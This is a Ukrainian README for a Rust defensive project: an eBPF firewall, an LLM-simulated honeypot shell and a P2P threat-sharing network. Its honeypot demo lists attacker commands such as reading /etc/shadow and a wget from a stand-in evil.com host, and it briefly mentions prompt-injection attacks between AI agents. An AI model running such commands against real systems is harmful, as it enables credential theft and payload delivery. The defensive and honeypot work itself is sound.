<p align="center">
  <strong>🌐 Мова:</strong>
  <a href="README.md">English</a> |
  <a href="README_UA.md">Українська</a> |
  <a href="README_RU.md">Русский</a>
</p>

<p align="center">
  <img src="https://readme-typing-svg.herokuapp.com?font=JetBrains+Mono&weight=800&size=45&duration=3000&pause=1000&color=FF0000&center=true&vCenter=true&width=600&lines=THE+BLACKWALL" alt="The Blackwall">
  <br>
  <em>Адаптивний eBPF файрвол з AI-ханіпотом та P2P загрозовою мережею</em>
</p>

# The Blackwall — Я побудував справжній Блеквол, бо Cyberpunk 2077 зламав мені мозок

<p align="center">
<img src="https://img.shields.io/badge/language-Rust-orange?style=for-the-badge&logo=rust" />
<img src="https://img.shields.io/badge/kernel-eBPF%2FXDP-blue?style=for-the-badge" />
<img src="https://img.shields.io/badge/AI-Ollama%20LLM-green?style=for-the-badge" />
<img src="https://img.shields.io/badge/P2P-libp2p-purple?style=for-the-badge" />
<img src="https://img.shields.io/badge/vibe-Cyberpunk-red?style=for-the-badge" />
</p>

<p align="center">
<em>"За Блекволом є речі, від погляду на які у нетраннера вигорить мозок."</em><br>
<strong>— Альт Каннінгем, мабуть</strong>
</p>

<p align="center">
<strong>Зараз будую enterprise AI-автоматизацію в <a href="https://dokky.com.ua">Dokky</a></strong><br>
<strong>Enterprise ліцензування та консалтинг: <a href="mailto:xzcrpw1@gmail.com">xzcrpw1@gmail.com</a></strong>
</p>

---

**TL;DR:** Грав у Cyberpunk, надихнувся, написав цілий адаптивний файрвол, що працює всередині ядра Linux, ловить загрози за допомогою AI, заманює атакерів у фейковий сервер на базі LLM, і ділиться загрозовою інфою через децентралізовану P2P-мережу.
**~21к рядків Rust. 298 тестів. 10 крейтів. Одна людина.**

---

## Що це?

**The Blackwall** — назва від цифрового бар'єру з Cyberpunk 2077, який тримає рогів AI від цивілізованого Нету.

Моя версія. Багаторівнева система захисту, яка не просто блокує загрози — вона їх вивчає, ловить в пастку і розповідає про них кожному іншому вузлу.

Три ключові рівні, що працюють разом:

**1. Файрвол на рівні ядра (eBPF/XDP)** — аналіз пакетів відбувається всередині ядра Linux ще до того, як трафік потрапить в мережевий стек. Рішення за наносекунди. Ентропійний аналіз, TLS-фінгерпринтинг, глибока інспекція пакетів, рейт-лімітинг, трекінг з'єднань — все працює в BPF віртуальній машині.

**2. AI-ханіпот (Tarpit)** — замість того, щоб просто дропати зловмисний трафік, він перенаправляється на фейковий Linux-сервер. LLM симулює bash, відповідає на команди, подає фейкові файли, грає роль зламаного `root@web-prod-03`. Атакери витрачають свій час, поки все записується.

**3. P2P загрозова мережа (HiveMind)** — вузли знаходять один одного, обмінюються IoC через зашифровану libp2p-мережу, голосують за загрози через консенсус, трекають репутацію пірів. Одна нода ловить сканер — всі інші дізнаються за секунди.

Плюс: розподілений контролер сенсорів, API для інтеграції з SIEM (STIX/TAXII/Splunk/QRadar/CEF), TUI-дашборд, поведінковий профайлінг по кожному IP, інгест загрозових фідів, PCAP-форензіка.

---

## Архітектура

![Blackwall Architecture](assets/architecture.svg)

![Threat Signal Flow](assets/signal-flow.svg)

**Пайплайн:**

```
Пакет приходить
  → XDP: ентропія, блокліст/вайтліст, CIDR, рейт-ліміт, JA4, DPI
  → RingBuf (zero-copy) → Демон в юзерспейсі
  → Статичні правила → Поведінковий автомат → JA4 БД → LLM класифікація
  → Вердикт: PASS / DROP / REDIRECT_TO_TARPIT
  → eBPF BLOCKLIST оновлюється в реальному часі
  → IoC розшарюється в HiveMind P2P-мережу
```

---

## Що робить кожен крейт

### blackwall-ebpf — Рівень ядра (1,334 рядки)

eBPF-програми на XDP-хуку — найраніша точка, де можна торкнутись пакета. Працює під жорсткими правилами BPF-верифікатора: 512 байт стеку, без хіпа, без float, тільки обмежені цикли.

- **Розрахунок ентропії** — частотний аналіз байтів, цілочисельна ентропія Шеннона (0–7936). Висока ентропія на не-TLS портах → зашифрований C2-трафік
- **TLS-фінгерпринтинг** — парсить ClientHello, витягує cipher suites, extensions, ALPN, SNI → JA4-відбиток. Один фінгерпринт покриває тисячі ботів з тією ж TLS-лібою
- **DPI через tail calls** — `PROG_ARRAY` диспатчить протокольні аналізатори:
  - HTTP: метод + URI (ловить `/wp-admin`, `/phpmyadmin`, path traversal)
  - DNS: довжина запиту + кількість лейблів (детекція DNS-тунелювання)
  - SSH: фінгерпринтинг банера (`libssh`, `paramiko`, `dropbear`)
- **DNAT-редірект** — підозрілий трафік тихо NAT'иться на тарпіт. Атакер не знає, що покинув реальний сервер
- **Трекінг з'єднань** — stateful TCP-моніторинг, LRU-мап (16K записів)
- **Рейт-лімітинг** — per-IP token bucket, запобігає флуду і переповненню RingBuf
- **4 RingBuf-канали** — EVENTS, TLS_EVENTS, EGRESS_EVENTS, DPI_EVENTS

Мапи: `BLOCKLIST`, `ALLOWLIST`, `CIDR_RULES`, `COUNTERS`, `RATE_LIMIT`, `CONN_TRACK`, `NAT_TABLE`, `TARPIT_TARGET`, `PROG_ARRAY`, плюс 4 RingBuf-мапи.

### blackwall — Мозок (6,362 рядки)

Головний демон. Завантажує eBPF-програми, споживає евенти з RingBuf, запускає пайплайн рішень.

- **Rules engine** — статичний блокліст/вайтліст, CIDR-діапазони з конфіга + фіди
- **Поведінковий автомат** — профайлінг по IP: частота з'єднань, різноманіття портів, розподіл ентропії, аналіз таймінгу. Фази: `New → Suspicious → Malicious → Blocked` (або `→ Trusted`). Детекція біконінгу через цілочисельний CoV
- **JA4-база** — матчинг TLS-фінгерпринтів з відомими шкідливими сигнатурами
- **AI-класифікація** — інтеграція з Ollama, моделі ≤3B параметрів (Qwen3 1.7B/0.6B). Батчинг евентів, структуровані JSON-вердикти
- **Загрозові фіди** — інгест зовнішніх фідів (Firehol, abuse.ch)
- **PCAP-захоплення** — форензічний запис з ротацією + компресією
- **Зворотний зв'язок у реальному часі** — вердикти пишуться назад у eBPF BLOCKLIST
- **HiveMind-бридж** — підтверджені IoC шарються в P2P-мережу

### tarpit — Пастка (2,179 рядків)

Рівень обману. Атакери, перенаправлені сюди через DNAT, думають, що потрапили на реальний сервер.

- **Авто-детекція протоколу** — визначає SSH, HTTP, MySQL, DNS по першим байтам
- **Хендлери протоколів:**
  - SSH: банер, авторизація, PTY-сесія
  - HTTP: фейковий WordPress, `/wp-admin`, `.env`, реалістичні хедери
  - MySQL: хендшейк, авторизація, відповіді з фейковими даними
  - DNS: правдоподібні відповіді на запити
- **LLM-симуляція bash** — кожна команда → Ollama. `ls -la` повертає файли, `cat /etc/shadow` — хеші, `wget` — "завантажує", `mysql -u root` — "підключається". LLM не знає, що це ханіпот
- **Експоненціальний джиттер** — чанки 1-15 байт, затримка 100мс–30с. Максимум витраченого часу
- **Анти-фінгерпринтинг** — рандомізовані TCP window, TTL, початкова затримка. p0f/Nmap не розпізнають
- **Захист від prompt injection** — 25+ паттернів, симуляція ніколи не ламається
- **Credential canaries** — всі введені креди логуються
- **Управління сесіями** — стан по з'єднанню, історія команд, трекінг CWD

### hivemind — Мережа (6,526 рядків)

Децентралізований threat intelligence на libp2p.

- **Транспорт** — QUIC + Noise-шифрування, кожне з'єднання автентифіковане
- **Пошук пірів** — Kademlia DHT (глобальний), mDNS (локальний), конфігуровані seed-піри
- **Обмін IoC** — GossipSub pub/sub, пропагація по мережі за секунди
- **Консенсус** — N незалежних підтверджень обов'язкові. Ніякої одноджерельної довіри
- **Репутація** — піри заробляють реп за хороші IoC, втрачають за фолси. Погані актори слешуються
- **Захист від Sybil** — PoW-челенджі, детекція самопосилань в k-buckets, рейт-ліміт реєстрації
- **Федеративне навчання** — локальний тренінг + FedAvg-агрегація, шарінг градієнтів (FHE-стаб)
- **Захист від data poisoning** — моніторинг розподілу градієнтів, детекція model inversion
- **ZKP-інфраструктура** — Groth16 стаби для trustless-верифікації IoC

### hivemind-api — Enterprise-інтеграція (2,711 рядків)

REST API для підключення HiveMind-даних до корпоративних SIEM.

- **STIX 2.1** — стандартний формат threat intelligence
- **TAXII 2.1** — протокол обміну загрозами
- **Splunk HEC** — HTTP Event Collector
- **QRadar LEEF** — Log Event Extended Format
- **CEF** — Common Event Format
- **Тіроване ліцензування** — Basic / Professional / Enterprise / NationalSecurity
- **Лайв-статистика** — XDP-каунтери + P2P-метрики в реальному часі

### hivemind-dashboard — Монітор (571 рядок)

TUI-дашборд. Чистий ANSI — без ratatui, без crossterm, сирі escape-коди. Лайв-статус мережі.

### blackwall-controller — Командний центр (356 рядків)

CLI для управління декількома сенсорами. HMAC-автентифікація (PSK). Статистика, список заблокованих IP, здоров'я всіх нод з одного місця.

### common — Контракт (1,126 рядків)

`#[repr(C)]` типи між ядром і юзерспейсом: `PacketEvent`, `RuleKey`, `TlsComponentsEvent`, `DpiEvent`, каунтери, base64. Контракт, на якому побудована вся система.

### xtask — Білд-тули (46 рядків)

`cargo xtask build-ebpf` — компіляція nightly + `bpfel-unknown-none`.

---

## Стек технологій

| Рівень | Технологія | Чому |
|--------|-----------|------|
| Ядро | **aya-rs** (eBPF/XDP) | Чистий Rust eBPF — без C, без libbpf |
| Рантайм | **Tokio** (current_thread) | Однопотоковий, без оверхеду |
| IPC | **RingBuf** | Zero-copy, 7.5% оверхед проти 35% у PerfEventArray |
| Конкурентність | **papaya** + **crossbeam** | Lock-free мапи + MPMC-черги |
| P2P | **libp2p** | QUIC, Noise, Kademlia, GossipSub, mDNS |
| Крипта | **ring** | ECDSA, SHA256, HKDF, HMAC |
| HTTP | **hyper** 1.x | Мінімальний. Без веб-фреймворків |
| AI | **Ollama** | Локальний інференс, GGUF-квантизація |
| Конфіг | **TOML** | Читабельний, мінімальний |
| Логування | **tracing** | Структуроване. Zero `println!` в проді |

**22 залежності.** Кожна обґрунтована. Без bloat-крейтів.

---

## Деплой

```
deploy/
  docker/
    Dockerfile.blackwall       # Multi-stage, stripped binary
    Dockerfile.ebpf            # Nightly eBPF build
  helm/
    blackwall/                 # K8s DaemonSet + ConfigMap
  systemd/
    server/                    # Серверні юніти
    laptop/                    # Dev/ноутбук юніти
  examples/                    # Приклади конфігів
  healthcheck.sh               # Перевірка компонентів
```

Docker multi-stage. Helm для K8s (DaemonSet, один на ноду, `CAP_BPF`). systemd для bare metal.

---

## Швидкий старт

### Вимоги

- Linux 5.15+ з BTF (або WSL2 з кастомним ядром)
- Rust stable + nightly з `rust-src`
- `bpf-linker` — `cargo install bpf-linker`
- Ollama (опціонально, для AI)

### Збірка

```bash
cargo xtask build-ebpf                      # eBPF (nightly)
cargo build --release --workspace            # весь юзерспейс
cargo clippy --workspace -- -D warnings      # лінт
cargo test --workspace                       # 298 тестів
```

### Запуск

```bash
sudo RUST_LOG=info ./target/release/blackwall config.toml    # потрібен root/CAP_BPF
RUST_LOG=info ./target/release/tarpit                        # ханіпот
RUST_LOG=info ./target/release/hivemind                      # P2P-нода
RUST_LOG=info ./target/release/hivemind-api                  # API загрозових фідів
./target/release/hivemind-dashboard                          # TUI
BLACKWALL_PSK=<key> ./target/release/blackwall-controller stats <ip>:<port>
```

### Конфіг

```toml
[network]
interface = "eth0"
xdp_mode = "generic"

[thresholds]
entropy_anomaly = 6000

[tarpit]
enabled = true
port = 2222
base_delay_ms = 100
max_delay_ms = 30000

[tarpit.services]
ssh_port = 22
http_port = 80
mysql_port = 3306
dns_port = 53

[ai]
enabled = true
ollama_url = "http://localhost:11434"
model = "qwen3:1.7b"
fallback_model = "qwen3:0.6b"

[rules]
blocklist = ["1.2.3.4"]
allowlist = ["127.0.0.1"]

[feeds]
enabled = true
refresh_interval_secs = 3600

[pcap]
enabled = true
output_dir = "/var/lib/blackwall/pcap"

[distributed]
enabled = false
mode = "standalone"
bind_port = 9471
psk = "your-256bit-hex-key"
```

---

## Тарпіт в дії

Підключаєшся до тарпіта і бачиш:

```
Ubuntu 24.04.2 LTS web-prod-03 tty1

web-prod-03 login: root
Password:
Last login: Thu Mar 27 14:22:33 2025 from 10.0.0.1

root@web-prod-03:~#
```

Нічого з цього не існує. LLM грає в bash. `ls` — файли. `cat /etc/passwd` — юзери. `mysql -u root -p` — підключення. `wget http://evil.com/payload` — завантаження.

30 хвилин на сервері, якого нема. Кожен кістрок записаний. IoC розшарені в мережу.

---

## Модель безпеки

- Кожен байт з пакетів = контрольований атакером. Всі `ctx.data()` з bounds-check
- Zero `unwrap()` в проді — `?`, `expect("reason")`, або `match`
- Prompt injection: очікується. 25+ паттернів ловиться, симуляція не ламається
- P2P: Sybil guard (PoW + слешінг репутації), N-of-M консенсус по IoC
- Тарпіт: TCP-рандомізація — p0f/Nmap не зможуть зафінгерпринтити
- Контролер: HMAC-автентифікований, без неавторизованого доступу
- Ядро: рейт-лімітинг запобігає переповненню RingBuf
- Шатдаун: чистить правила файрволу, ніяких осиротілих iptables-записів

---

## Enterprise-версія

**[Blackwall Enterprise](https://github.com/xzcrpw/blackwall-enterprise)** додає те, чого немає ні в кого: **аналіз Agent-to-Agent (A2A) трафіку в реальному часі на рівні ядра.**

AI-агенти починають спілкуватись між собою — LLM-to-LLM, через MCP, A2A-протокол, агентні фреймворки. Це нова поверхня атаки: prompt injection через міжагентну комунікацію, підробка інтентів, крадіжка ідентичності агентів. На ринку нічого для цього нема. Blackwall Enterprise — перший і єдиний такий модуль.

**~8,400 рядків Rust.** Окреме репо, окрема ліцензія.

| Компонент | Що робить |
|-----------|-----------|
| **A-JWT Валідація** | Верифікація Agentic JWT за IETF-драфтом. Перевірка підпису через `ring`, запобігання реплею, кешування ключів |
| **Верифікація інтентів** | Вичерпний матчинг полів — `max_amount`, `allowed_recipients` (glob), allowlist дій |
| **Чексума агента** | SHA256(system_prompt + tools_config) — темперинг = миттєвий блок |
| **Proof-of-Possession** | cnf/jwk ECDSA-прив'язка — доводить, що агент тримає свій ключ |
| **eBPF Uprobes** | Хуки в OpenSSL/GnuTLS `SSL_write`/`SSL_read` — перехоплює A2A-плейнтекст без розриву TLS |
| **Risk-Based Routing** | Конфігуровані policy: allow / review / block по рівню ризику |
| **ZK Proofs** | Атестація порушень без розкриття сирого трафіку (Groth16) |
| **P2P Gossip** | Proof порушень броадкастяться в HiveMind-меш |

**Ліцензування:** [xzcrpw1@gmail.com](mailto:xzcrpw1@gmail.com)

---

## Статистика

```
Мова:            100% Rust
Всього:          ~21,200 рядків
Файлів:          92 .rs
Крейтів:         10
Тестів:          298
unwrap():        0 в проді
Залежностей:     22 (проаудитовані)
eBPF-стек:       ≤ 512 байт завжди
Clippy:          -D warnings, нуль проблем
CI:              check + clippy + tests + eBPF nightly build
```

---

## Кіберпанк-довідка

| Cyberpunk 2077 | Цей проект |
|----------------|-----------|
| The Blackwall | Файрвол на рівні ядра eBPF/XDP |
| ICE | XDP fast-path: ентропія + JA4 + DPI + DNAT |
| Демони | LLM-тарпіт — фейковий сервер за стіною |
| NetWatch | Поведінковий движок + автомат по IP |
| Rogue AIs | Ботнети, сканери, C2-бікони |
| Braindance | PCAP-форензіка |
| Колектив нетраннерів | HiveMind P2P-меш |
| Інфа від фіксерів | Загрозові фіди |
| Arasaka C&C | Розподілений контролер |

---

## Дисклеймер

Дослідницький проект у сфері безпеки. Для захисту вашої власної інфраструктури. Не використовуйте проти інших.

Не афілійований з CD Projekt Red. Просто гра, яка перекроїла мій мозок найкращим чином.

---

## Ліцензія

**BSL 1.1** (Business Source License)

Ліцензіар: Vladyslav Soliannikov
Change Date: April 8, 2030
Change License: Apache-2.0

---

<p align="center">
<strong>Подобається? <a href="https://github.com/xzcrpw/blackwall">Став зірку</a></strong>
</p>

<p align="center">
<strong><em>"Прокинься, самурай. Маємо мережу захищати."</em></strong>
</p>
